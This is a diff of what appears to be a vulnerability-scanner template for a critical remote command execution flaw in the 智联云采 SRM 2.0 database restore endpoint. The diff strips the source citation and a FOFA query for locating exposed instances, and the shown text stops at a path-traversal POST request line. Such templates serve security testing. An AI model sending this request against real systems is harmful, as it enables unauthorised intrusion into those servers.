@@ -3,12 +3,8 @@ info:
   name: 智联云采 SRM2.0 restore 存在远程命令执行漏洞
   author: hacktwo
   severity: critical
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/qc9fglvxkrgxu829'
+  description: ''
   tags: rce,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: qc9fglvxkrgxu829
-    fofa: title=="SRM 2.0" && body="href=\"/assets/img/favicon.ico\""
 http:
 - raw:
   - 'POST /adpweb/static/..;/a/db/dbBackupScheme/restore HTTP/1.1
